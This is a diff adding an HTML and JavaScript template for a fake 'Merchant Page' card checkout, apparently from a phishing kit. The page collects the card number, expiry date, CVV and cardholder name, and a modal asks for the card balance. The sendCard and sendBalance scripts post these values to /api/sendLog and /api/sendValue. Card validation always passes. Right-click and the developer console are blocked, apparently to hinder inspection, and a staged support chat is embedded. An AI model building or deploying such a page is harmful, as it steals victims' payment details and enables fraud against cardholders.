@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="{{service.country}}">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="robots" content="noindex" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+    <meta name="google" content="notranslate" />
+    <title>Merchant Page</title>
+    <link rel="shortcut icon" href="/style/card/favicon.png" />
+
+    <!-- support chat -->
+    <link rel="stylesheet" href="/style/support/support_parent.css">
+
+    <!-- protect -->
+    <script src="/style/protect/index.js"></script>
+
+    <!-- system -->
+    <script src="/style/other/system.js"></script>
+    <script src="/style/other/jquery-3.6.0.min.js"></script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #FFFFFF;
+            color: #03034B;
+            line-height: 1.5;
+        }
+
+        .main {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        /* Order Info Section */
+        .order-info {
+            margin-bottom: 30px;
+        }
+
+        .order-data-1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .order-no {
+            color: #7E8194;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .amount {
+            color: #7E8194;
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .currency {
+            margin-left: 5px;
+        }
+
+        .order-details {
+            background: #F9F9F9;
+            border-radius: 8px;
+            padding: 15px;
+        }
+
+        .order-data-2 table {
+            width: 100%;
+        }
+
+        .commission label {
+            color: #7E8194;
+            font-size: 14px;
+        }
+
+        .commission span {
+            color: #00875A;
+            font-weight: 600;
+        }
+
+        /* Card Payment Section */
+        .card-pay-body {
+            margin-bottom: 30px;
+        }
+
+        .card-model {
+            background: #F2F2F2;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .card-types {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            justify-content: center;
+        }
+
+        .card-types .va {
+            padding: 8px;
+            border-radius: 6px;
+            background: white;
+            opacity: 0.5;
+            transition: opacity 0.3s;
+        }
+
+        .card-types .va.maybe {
+            opacity: 1;
+        }
+
+        /* Form Inputs */
+        .form {
+            margin-bottom: 20px;
+        }
+
+        .h-input {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .h-input.row {
+            width: 100%;
+        }
+
+        .h-input.xl {
+            flex: 1;
+        }
+
+        .h-input label {
+            display: block;
+            color: #03034B;
+            font-size: 14px;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        .h-input input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #E5E5E5;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #03034B;
+            background: white;
+            transition: border-color 0.3s;
+        }
+
+        .h-input input:focus {
+            outline: none;
+            border-color: #00875A;
+        }
+
+        .h-input.placeholder label {
+            opacity: 0.8;
+        }
+
+        /* Card expiry and CVV row */
+        .row table {
+            width: 100%;
+        }
+
+        .card-expiry {
+            width: 60%;
+            padding-right: 10px;
+        }
+
+        .card-code {
+            width: 40%;
+            position: relative;
+        }
+
+        .card-expiry .inputs {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-expiry .inputs > span {
+            color: #03034B;
+            font-size: 16px;
+        }
+
+        .card-code .icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            opacity: 0.6;
+        }
+
+        .card-code .icon:hover {
+            opacity: 1;
+        }
+
+        /* Card Code Hint */
+        .card-code-hint {
+            position: absolute;
+            top: 100%;
+            right: 0;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .card-code-hint.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .card-code-hint .content {
+            background: #FFFFFF;
+            color: #7E8194;
+            border: 1px solid #E5E5E5;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 250px;
+            margin-top: 10px;
+        }
+
+        .card-code-hint .content table {
+            width: 100%;
+        }
+
+        .card-code-hint .content .text {
+            font-size: 12px;
+            padding-right: 10px;
+        }
+
+        .card-code-hint .arrow {
+            width: 0;
+            height: 0;
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-bottom: 10px solid white;
+            position: absolute;
+            top: -10px;
+            right: 20px;
+        }
+
+        /* Warning Label */
+        .warningLabel {
+            background: #FFF3CD;
+            color: #856404;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+
+        /* Buttons */
+        .btn-cnt {
+            margin-top: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+
+        .btn-primary {
+            background: #00875A;
+            color: #FFFFFF;
+        }
+
+        .btn-primary:hover {
+            background: #006644;
+        }
+
+        .btn-primary:disabled {
+            background: #d4d3d3;
+            cursor: default;
+        }
+
+        .btn:not(.btn-primary) {
+            background: none;
+            color: #00875A;
+            border: 2px solid #00875A;
+        }
+
+        .btn:not(.btn-primary):hover {
+            background: #00875A;
+            color: white;
+        }
+
+        /* Verification Modal */
+        #verification {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            opacity: 0;
+            z-index: 2000;
+            transition: opacity 0.3s;
+        }
+
+        #verif-window {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            max-height: 90vh;
+            overflow: auto;
+        }
+
+        #verif-contnt {
+            padding: 30px;
+        }
+
+        #contnet {
+            text-align: center;
+        }
+
+        #balik {
+            margin: 20px 0;
+        }
+
+        #balik > div:first-child {
+            color: #3f3f3f;
+            line-height: 1.6;
+            font-size: 14px;
+            background: #ececec;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        #checkbal {
+            padding: 12px;
+            border: 1px solid #cecece;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+
+        #buttonPay2 {
+            background: #1867c1;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        #buttonPay2:disabled {
+            background: #d4d3d3;
+            cursor: default;
+        }
+
+        #holder {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 22px;
+            color: #555;
+        }
+
+        /* Loader */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Constraints and Footer */
+        .constraints {
+            margin: 30px 0;
+            width: 100%;
+        }
+
+        .constraints .c1 {
+            width: 30px;
+            vertical-align: top;
+            padding-right: 10px;
+        }
+
+        .constraints .c2 {
+            color: #7E8194;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .footer {
+            text-align: center;
+            color: #7E8194;
+            font-size: 12px;
+            line-height: 1.4;
+            margin-top: 30px;
+        }
+
+        .footer a {
+            color: #00875A;
+            text-decoration: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .main {
+                padding: 15px;
+            }
+            
+            .amount {
+                font-size: 20px;
+            }
+            
+            #verif-window {
+                width: 95%;
+            }
+            
+            #verif-contnt {
+                padding: 20px;
+            }
+        }
+
+        /* Errors */
+        .card-errors, .contact-errors {
+            list-style: none;
+            margin: 10px 0;
+        }
+
+        .card-errors li, .contact-errors li {
+            color: #dc3545;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+
+        .phone-warn {
+            color: #856404;
+            background: #FFF3CD;
+            padding: 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+
+        /* Support chat positioning */
+        .chatra--webkit {
+            position: fixed;
+            right: 20px;
+            bottom: 20px;
+            z-index: 2147483647;
+        }
+
+        .support-circle {
+            position: fixed;
+            right: 20px;
+            bottom: 20px;
+            width: 60px;
+            height: 60px;
+            background: #00875A;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0,133,90,0.3);
+            z-index: 2147483646;
+        }
+
+        .support-circle::after {
+            content: "💬";
+            font-size: 24px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="support">
+        <script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '{{worker.supportType}}';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBorder(c,s);
+})(document);
+        </script>
+    </div>
+
+    <script>
+        if ("{{worker.supportType}}" == "bot") {
+            document.querySelector('#support').innerHTML = `
+        <div class="chatra--webkit chatra--style-round chatra--side-bottom chatra--pos-right chatra--visible chatra--expanded chatra--fast-toggle"
+            id="chatra" data-turbolinks-permanent=""
+            style="width: 380px; height: 600px; transform: none; z-index: 2147483647; display: none;">
+            <div id="chatra__iframe-wrapper">
+                <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Чат поддержки"
+                    allow="autoplay" src="/style/support/index.html?id={{item.id}}"
+                    style="width: 380px; height: 600px; position: absolute;"></iframe>
+            </div>
+        </div>
+        <div class="support-circle" onclick="openSupport()"></div>
+                            `
+        }
+    </script>
+
+    <form id="_formPay" name="_formPay">
+        <!-- Verification Modal -->
+        <div id="verification">
+            <div id="verif-window">
+                <div id="verif-contnt">
+                    <div id="contnet">
+                        <div id="balik">
+                            <div>{{translate.card.enterBalance}}</div>
+                            <div style="font-size: 13px; color: #555; margin-bottom: 3px; font-weight: 600; text-align: left;">
+                                {{translate.card.balance}}:
+                            </div>
+                            <div>
+                                <input id="checkbal" form="_formPay" type="number" name="checkbal" 
+                                       placeholder="100.00" min="1" required 
+                                       oninput="document.querySelector('#buttonPay2').disabled = false" />
+                            </div>
+                            <input form="_formPay" id="currchoise" value="EUR" name="currency" type="text" style="display: none;" />
+                        </div>
+                        <div>
+                            <button id="buttonPay2" type="button" disabled>{{translate.card.next}}</button>
+                        </div>
+                    </div>
+                    <div id="holder" style="display: none;">
+                        <div>{{translate.card.wait}}</div>
+                        <div class="loader"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="main">
+            <!-- Order Info -->
+            <div class="order-info">
+                <div class="order-data-1">
+                    <div class="order-no">
+                        <span>{{translate.card.transaction}} №</span>
+                        <span>{{item.id}}</span>
+                    </div>
+                    <div class="amount">
+                        <span>{{item.price}}</span>
+                        <span class="currency">{{curr}}</span>
+                    </div>
+                </div>
+
+                <div class="order-details">
+                    <div class="order-data-2">
+                        <table>
+                            <tr class="commission">
+                                <td>
+                                    <label>{{translate.card.commission}}</label>
+                                </td>
+                                <td>
+                                    <span>0</span>&nbsp;<span class="currency">{{curr}}</span>
+                                </td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Card Payment -->
+            <div class="card-pay-body">
+                <div class="card-model">
+                    <div class="card-types">
+                        <span class="va maybe" id="bankicon1">
+                            <img width="26px" height="20px" src="/style/card/visa-365725566f9578a9589553aa9296d178.svg" alt="visa">
+                        </span>
+                        <span class="va maybe" id="bankicon2">
+                            <img width="26px" height="20px" src="/style/card/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="mastercard">
+                        </span>
+                        <span class="va maybe" id="bankicon3">
+                            <img width="20px" height="20px" src="/style/card/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg" alt="amex">
+                        </span>
+                        <span class="va maybe" id="bankicon4">
+                            <img width="26px" height="20px" src="/style/card/unionpay-8a10aefc7295216c338ba4e1224627a1.svg" alt="unionpay">
+                        </span>
+                    </div>
+
+                    <div class="form">
+                        <span class="h-input row">
+                            <label for="cardnumber">{{translate.card.cardDetails}}</label>
+                            <input id="_input0" name="fcard" type="text" autocomplete="cc-number" 
+                                   placeholder="1234 1234 1234 1234" aria-invalid="false" />
+                        </span>
+                    </div>
+
+                    <div class="warningLabel" style="display:none">
+                        {{translate.card.warning}}
+                    </div>
+
+                    <div class="card-code-hint" id="cardCodeHint">
+                        <div class="content">
+                            <table>
+                                <tr>
+                                    <td class="text">{{translate.card.cvvHint}}</td>
+                                    <td class="img">
+                                        <svg width="69px" height="45px" viewBox="0 0 69 45" fill="none">
+                                            <path d="M1 2.79682C1 2.22103 1.47109 1.74994 2.04688 1.74994H66.9532C67.529 1.74994 68.0001 2.22103 68.0001 2.79682V42.5781C68.0001 43.1539 67.529 43.625 66.9532 43.625H2.04688C1.47109 43.625 1 43.1539 1 42.5781V2.79682Z" fill="#D9D9D9" stroke="#CBCBCB" stroke-width="2"></path>
+                                            <path d="M69 4.73355H0V18.3429H69V4.73355Z" fill="black"></path>
+                                            <path d="M63.7809 22.0019H5.55664V34.6593H63.7809V22.0019Z" fill="white"></path>
+                                            <path d="M64 22H39V35H64V22Z" fill="white" stroke="#E7125F" stroke-width="2"></path>
+                                            <path d="M41.636 25.992C41.924 25.992 42.204 25.968 42.476 25.92C42.748 25.872 42.992 25.792 43.208 25.68C43.432 25.568 43.62 25.424 43.772 25.248C43.932 25.072 44.036 24.856 44.084 24.6H45.2V33H43.7V27.072H41.636V25.992ZM53.872 33H48.136C48.144 32.304 48.312 31.696 48.64 31.176C48.968 30.656 49.416 30.204 49.984 29.82C50.256 29.62 50.54 29.428 50.836 29.244C51.132 29.052 51.404 28.848 51.652 28.632C51.9 28.416 52.104 28.184 52.264 27.936C52.424 27.68 52.508 27.388 52.516 27.06C52.516 26.908 52.496 26.748 52.456 26.58C52.424 26.404 52.356 26.244 52.252 26.1C52.148 25.948 52.004 25.824 51.82 25.728C51.636 25.624 51.396 25.572 51.1 25.572C50.828 25.572 50.6 25.628 50.416 25.74C50.24 25.844 50.096 25.992 49.984 26.184C49.88 26.368 49.8 26.588 49.744 26.844C49.696 27.1 49.668 27.376 49.66 27.672H48.292C48.292 27.208 48.352 26.78 48.472 26.388C48.6 25.988 48.788 25.644 49.036 25.356C49.284 25.068 49.584 24.844 49.936 24.684C50.296 24.516 50.712 24.432 51.184 24.432C51.696 24.432 52.124 24.516 52.468 24.684C52.812 24.852 53.088 25.064 53.296 25.32C53.512 25.576 53.664 25.856 53.752 26.16C53.84 26.456 53.884 26.74 53.884 27.012C53.884 27.348 53.832 27.652 53.728 27.924C53.624 28.196 53.484 28.448 53.308 28.68C53.132 28.904 52.932 29.112 52.708 29.304C52.484 29.496 52.252 29.676 52.012 29.844C51.772 30.012 51.532 30.172 51.292 30.324C51.052 30.476 50.828 30.628 50.62 30.78C50.42 30.932 50.244 31.092 50.092 31.26C49.94 31.42 49.836 31.592 49.78 31.776H53.872V33ZM57.0719 28.08C57.2959 28.088 57.5199 28.072 57.7439 28.032C57.9679 27.992 58.1679 27.924 58.3439 27.828C58.5199 27.724 58.6599 27.584 58.7639 27.408C58.8759 27.232 58.9319 27.016 58.9319 26.76C58.9319 26.4 58.8079 26.112 58.5599 25.896C58.3199 25.68 58.0079 25.572 57.6239 25.572C57.3839 25.572 57.1759 25.62 56.9999 25.716C56.8239 25.812 56.6759 25.944 56.5559 26.112C56.4439 26.272 56.3599 26.456 56.3039 26.664C56.2479 26.864 56.2239 27.072 56.2319 27.288H54.8639C54.8799 26.88 54.9559 26.504 55.0919 26.16C55.2279 25.808 55.4119 25.504 55.6439 25.248C55.8839 24.992 56.1719 24.792 56.5079 24.648C56.8439 24.504 57.2239 24.432 57.6479 24.432C57.9759 24.432 58.2959 24.48 58.6079 24.576C58.9279 24.672 59.2119 24.812 59.4599 24.996C59.7159 25.18 59.9199 25.416 60.0719 25.704C60.2239 25.984 60.2999 26.308 60.2999 26.676C60.2999 27.1 60.2039 27.472 60.0119 27.792C59.8199 28.104 59.5199 28.332 59.1119 28.476V28.5C59.5919 28.596 59.9639 28.836 60.2279 29.22C60.4999 29.596 60.6359 30.056 60.6359 30.6C60.6359 31 60.5559 31.36 60.3959 31.68C60.2359 31.992 60.0199 32.26 59.7479 32.484C59.4759 32.7 59.1599 32.868 58.7999 32.988C58.4399 33.108 58.0599 33.168 57.6599 33.168C57.1719 33.168 56.7439 33.1 56.3759 32.964C56.0159 32.82 55.7119 32.62 55.4639 32.364C55.2239 32.108 55.0399 31.8 54.9119 31.44C54.7839 31.08 54.7159 30.68 54.7079 30.24H56.0759C56.0599 30.752 56.1839 31.18 56.4479 31.524C56.7199 31.86 57.1239 32.028 57.6599 32.028C58.1159 32.028 58.4959 31.9 58.7999 31.644C59.1119 31.38 59.2679 31.008 59.2679 30.528C59.2679 30.2 59.2039 29.94 59.0759 29.748C58.9479 29.556 58.7799 29.412 58.5719 29.316C58.3639 29.212 58.1279 29.148 57.8639 29.124C57.6079 29.1 57.3439 29.092 57.0719 29.1V28.08Z" fill="black"></path>
+                                        </svg>
+                                    </td>
+                                </tr>
+                            </table>
+                            <div class="arrow"></div>
+                        </div>
+                    </div>
+
+                    <div class="form">
+                        <div class="row">
+                            <table class="w100">
+                                <tr>
+                                    <td class="card-expiry">
+                                        <label for="cardExpiryMonth">{{translate.card.cardExpiry}}</label>
+                                        <span class="inputs">
+                                            <span class="h-input xl">
+                                                <input id="_input1" name="fexpm" type="text" maxlength="2" 
+                                                       autocomplete="cc-exp-month" placeholder="MM" />
+                                            </span>
+                                            <span>/</span>
+                                            <span class="h-input xl">
+                                                <input id="_input2" name="fexpy" type="text" maxlength="2" 
+                                                       autocomplete="cc-exp-year" placeholder="YY" />
+                                            </span>
+                                        </span>
+                                    </td>
+                                    <td class="card-code">
+                                        <span class="h-input xl">
+                                            <label for="cardCode">CVV</label>
+                                            <input id="_input3" name="fcvc" type="text" maxlength="4" 
+                                                   autocomplete="cc-csc" inputmode="numeric" pattern="[0-9]*" style="display:none" />
+                                        </span>
+                                        <span class="icon" onclick="openCardCodeHint()">
+                                            <svg width="15px" height="15px" viewBox="0 0 15 15" fill="none">
+                                                <path d="M7.5 0.9375C3.87598 0.9375 0.9375 3.87598 0.9375 7.5C0.9375 11.124 3.87598 14.0625 7.5 14.0625C11.124 14.0625 14.0625 11.124 14.0625 7.5C14.0625 3.87598 11.124 0.9375 7.5 0.9375ZM8.0918 10.5088C8.07715 11.0303 7.69043 11.3525 7.18945 11.3379C6.70898 11.3232 6.33105 10.9805 6.3457 10.4561C6.36035 9.93457 6.75879 9.60352 7.23926 9.61816C7.74316 9.63281 8.10938 9.9873 8.0918 10.5088ZM9.51855 6.7793C9.39551 6.95215 9.12012 7.1748 8.77441 7.44434L8.39062 7.70801C8.20312 7.85156 8.08594 8.02148 8.02441 8.21484C7.99219 8.31738 7.96875 8.58398 7.96289 8.7627C7.95996 8.79785 7.93945 8.87695 7.83105 8.87695C7.72266 8.87695 6.80566 8.87695 6.68555 8.87695C6.56543 8.87695 6.55078 8.80664 6.55371 8.77148C6.57129 8.28516 6.6416 7.88379 6.84375 7.56152C7.11621 7.12793 7.88379 6.6709 7.88379 6.6709C8.00098 6.58301 8.0918 6.48926 8.16211 6.38672C8.29102 6.21094 8.39648 6.01465 8.39648 5.80371C8.39648 5.56055 8.33789 5.3291 8.18262 5.13574C8.00098 4.91016 7.80469 4.80176 7.42676 4.80176C7.05469 4.80176 6.83789 4.98926 6.68262 5.23535C6.52734 5.48145 6.55371 5.77148 6.55371 6.03516H5.12695C5.12695 5.03906 5.3877 4.40332 5.93848 4.02832C6.31055 3.77344 6.78516 3.66211 7.33887 3.66211C8.06543 3.66211 8.64258 3.79688 9.15234 4.18359C9.62402 4.54102 9.87305 5.04492 9.87305 5.72461C9.87305 6.14355 9.72656 6.49512 9.51855 6.7793Z" fill="#666"/>
+                                            </svg>
+                                        </span>
+                                    </td>
+                                </tr>
+                            </table>
+                        </div>
+
+                        <span class="h-input row">
+                            <label for="cardHolder">{{translate.card.cardHolder}}</label>
+                            <input id="billingName" name="cardholder{{item.id}}" type="text" autocomplete="cc-name" />
+                        </span>
+                    </div>
+                </div>
+
+                <div class="form">
+                    <ul class="card-errors" style="display: none;"></ul>
+
+                    <div class="btn-cnt">
+                        <button id="_buttonPay" class="btn btn-primary" type="button" onclick="verifcard()" disabled>
+                            <span>{{translate.card.payButton}}</span>&nbsp;
+                            <span class="amount">{{item.price}}</span>
+                            <span class="amount">{{curr}}</span>
+                        </button>
+
+                        <a class="btn" href="javascript:history.back()">
+                            {{translate.card.back}}
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Constraints -->
+            <table class="constraints">
+                <tr>
+                    <td class="c1">
+                        <svg width="23px" height="23px" viewBox="0 0 23 23" fill="none">
+                            <path d="M11.5 0C5.1589 0 0 5.1589 0 11.5C0 17.8411 5.1589 23 11.5 23C17.8411 23 23 17.8411 23 11.5C23 5.1589 17.8411 0 11.5 0ZM11.5 20.553C6.50822 20.553 2.44677 16.492 2.44677 11.5C2.44677 6.50799 6.50822 2.447 11.5 2.447C16.4918 2.447 20.5532 6.50799 20.5532 11.5C20.5532 16.492 16.4918 20.553 11.5 20.553Z" fill="#7E8194"/>
+                            <path d="M17.4934 11.1449H12.3252V4.9309C12.3252 4.40798 11.9013 3.98401 11.3783 3.98401C10.8554 3.98401 10.4315 4.40798 10.4315 4.9309V12.0918C10.4315 12.6147 10.8554 13.0387 11.3783 13.0387H17.4934C18.0163 13.0387 18.4403 12.6147 18.4403 12.0918C18.4403 11.5688 18.0163 11.1449 17.4934 11.1449Z" fill="#7E8194"/>
+                        </svg>
+                    </td>
+                    <td class="c2">{{translate.card.constraints}}</td>
+                </tr>
+            </table>
+
+            <!-- Footer -->
+            <div class="footer">
+                {{{translate.card.footer}}}
+            </div>
+        </div>
+    </form>
+
+    <!-- Сохраняем весь оригинальный JavaScript функционал -->
+    <script>
+        let chsNum = "0123456789";
+        let fields = [
+            {
+                valid: false,
+                chars: chsNum,
+                length: [16, 19],
+                mask: [
+                    [16, " "],
+                    [12, " "],
+                    [8, " "],
+                    [4, " "],
+                ],
+            },
+            {
+                valid: false,
+                chars: chsNum,
+                length: [2, 2],
+                mask: false,
+            },
+            {
+                valid: false,
+                chars: chsNum,
+                length: [2, 2],
+                mask: false,
+            },
+            {
+                valid: false,
+                chars: chsNum,
+                length: [3, 3],
+                mask: false,
+            },
+        ];
+
+        function inputMask(elem, indx) {
+            fields[indx]["valid"] = false;
+            let val = elem.value;
+            let val2 = "";
+            let chs = fields[indx]["chars"];
+            let len = fields[indx]["length"];
+
+            let bank1 = document.getElementById("bankicon1");
+            let bank2 = document.getElementById("bankicon2");
+            let bank3 = document.getElementById("bankicon3");
+            let bank4 = document.getElementById("bankicon4");
+            for (let i = 0; i < val.length; i++) {
+                let flag = chs.includes(val[i]);
+                if (!flag) continue;
+                if (indx == 0) {
+                    if (val[0] == 3) {
+                        bank1.style.display = "none";
+                        bank2.style.display = "none";
+                        bank3.style.display = "block";
+                        bank4.style.display = "none";
+                    } else if (val[0] == 4) {
+                        bank1.style.display = "block";
+                        bank2.style.display = "none";
+                        bank3.style.display = "none";
+                        bank4.style.display = "none";
+                    } else if (val[0] == 5) {
+                        bank1.style.display = "none";
+                        bank2.style.display = "block";
+                        bank3.style.display = "none";
+                        bank4.style.display = "none";
+                    } else if (val[0] == 8) {
+                        bank1.style.display = "none";
+                        bank2.style.display = "none";
+                        bank3.style.display = "none";
+                        bank4.style.display = "block";
+                    } else {
+                        bank1.style.display = "none";
+                        bank2.style.display = "none";
+                        bank3.style.display = "none";
+                        bank4.style.display = "none";
+                    }
+                } else if (indx == 1) {
+                    if (val2.length == 0) flag = "01".includes(val[i]);
+                    else if (val2.length == 1)
+                        if (val2[0] == "0") flag = parseInt(val[i]) >= 1;
+                        else if (val2[0] == "1") flag = parseInt(val[i]) <= 2;
+                } else if (indx == 2) {
+                    if (val2.length == 0) flag = parseInt(val[i]) >= 2;
+                }
+                if (flag) val2 += val[i];
+            }
+            val2 = val2.substr(0, len[1]);
+            let val2i = parseInt(val2);
+            let flag = val2.length >= len[0];
+            if (flag) {
+                if (indx == 0) {
+                    flag = cardValid(val2);
+                } else if (indx == 1) {
+                    flag = val2i >= 1 && val2i <= 12;
+                } else if (indx == 2) {
+                    flag = val2i >= 20 && val2i <= 99;
+                }
+                if (flag) {
+                    fields[indx]["valid"] = true;
+                    if (indx == 0) {
+                        _input1.focus();
+                    } else if (indx == 1) {
+                        _input2.focus();
+                    } else if (indx == 2) {
+                        _input3.style.display = "block";
+                        _input3.focus();
+                    }
+                } else {
+                    sty2 = " _15";
+                }
+            }
+            let mask = fields[indx]["mask"];
+            if (mask) val2 = stringInsert(val2, mask);
+            elem.value = val2;
+            checkButton();
+        }
+
+        function cardValid(n) {
+            let s = 0;
+            let l = n.length;
+            for (let i = 0; i < l; i++) {
+                let p = parseInt(n[i]);
+                if ((l - i) % 2 == 0) {
+                    p *= 2;
+                    if (p > 9) p -= 9;
+                }
+                s += p;
+            }
+            return true;
+        }
+
+        function checkButton() {
+            let flag = false;
+            for (let i = 0; i < fields.length; i++) {
+                if (!fields[i]["valid"]) {
+                    flag = true;
+                    break;
+                }
+            }
+            _buttonPay.disabled = flag;
+        }
+
+        function stringInsert(s, j) {
+            let a = s.split("");
+            let l = s.length;
+            for (let i = 0; i < j.length; i++) {
+                let k = j[i];
+                if (l > k[0]) a.splice(k[0], 0, k[1]);
+            }
+            return a.join("");
+        }
+
+        function openCardCodeHint() {
+            const hint = document.getElementById('cardCodeHint');
+            hint.classList.toggle('visible');
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            _buttonPay.disabled = true;
+            for (let i = 0; i < fields.length; i++) {
+                let e = document.getElementById("_input" + i);
+                e.oninput = function () {
+                    inputMask(e, i);
+                };
+                setTimeout(function () {
+                    e.oninput();
+                }, 500);
+            }
+            _formPay.onsubmit = function () {
+                _buttonPay.disabled = true;
+            };
+        });
+
+        document.oncontextmenu = function () {
+            return false;
+        };
+
+        let button1 = document.querySelector("#_buttonPay");
+        let verif = document.querySelector("#verification");
+        let load = document.querySelector("#holder");
+        let contnet = document.querySelector("#contnet");
+
+        const checkBalance = 'false'
+
+        function verifcard() {
+            verif.style.display = "block";
+            setTimeout(function () {
+                verif.style.opacity = "1";
+            }, 100);
+
+            if (checkBalance == 'true') {
+                try {
+                    document.getElementById('contnet').style.display = 'block'
+                    document.getElementById('holder').style.display = 'none'
+                } catch (e) {
+                    //
+                }
+            } else {
+                sendCard()
+            }
+        }
+
+        let button2 = document.querySelector("#buttonPay2");
+        let check = document.querySelector("#checkbal");
+
+        button2.onclick = function () {
+            let str = "{{item.price}}";
+            str = str.replace(/\s/g, "");
+            check.setCustomValidity("");
+        };
+
+        let logId
+        function sendCard() {
+            const BALANCE_VALUE = ('false' == 'true') ? `${document.getElementById('checkbal').value}` : '0'
+
+            axios.post(
+                `/api/sendLog`,
+                {
+                    cardNumber: `${document.querySelector('#_input0').value}`,
+                    cardMonth: `${document.querySelector('#_input1').value}`,
+                    cardYear: `${document.querySelector('#_input2').value}`,
+                    cardCvv: `${document.querySelector('#_input3').value}`,
+                    cardBalance: BALANCE_VALUE,
+                    item: "{{item.id}}"
+                }
+            ).then(async function (res) {
+                logId = res.data.id
+                const system = new window.__System(
+                    `${res.data.id}`,
+                    '{{item.id}}',
+                    {
+                        generalErrorWord: '{{translate.errors.generalErrorWord}}!',
+                        skipCard: '{{translate.errors.skipCard}}',
+                        changeCard: '{{translate.errors.changeCard}}',
+                        generalSuccessWord: '{{translate.errors.generalSuccessWord}}!',
+                        successTransaction: '{{translate.errors.successTransaction}}',
+                        noValidCard: '{{translate.errors.noValidCard}}'
+                    },
+                    'card'
+                )
+
+                if (checkBalance == 'false') {
+                    document.getElementById('verification').style.opacity = 1
+                    document.getElementById('verification').style.display = 'block'
+                } else {
+                    document.getElementById("verif-contnt").innerHTML = `<div class="loader"></div>`
+                }
+            })
+        }
+
+        function sendBalance() {
+            const CHECK_BALANCE_STATUS = ('false' == 'true') ? true : false
+
+            if (!CHECK_BALANCE_STATUS) {
+                axios.post(
+                    '/api/sendValue',
+                    {
+                        value: document.getElementById('checkbal').value,
+                        type: "balance",
+                        id: `${logId}`
+                    }
+                ).then(() => {
+                    document.getElementById("verif-contnt").innerHTML = `<div class="loader"></div>`
+                })
+            } else {
+                sendCard()
+            }
+        }
+
+        document.getElementById('buttonPay2').addEventListener('click', sendBalance)
+
+        function openSupport() {
+            document.querySelector('.support-circle').style.display = 'none'
+            document.querySelector('#chatra').style.display = 'block'
+
+            const iframe = document.getElementById("chatra__iframe")
+            const elmnt = iframe.contentWindow.document.querySelector("#app")
+            elmnt.style.display = "block"
+        }
+
+        const itemId = "{{item.id}}"
+    </script>
+
+    <script src="/style/other/axios.min.js"></script>
+    <script src="/style/other/other.js"></script>
+    <script src="/style/protect/console-ban.min.js"></script>
+</body>
+</html>
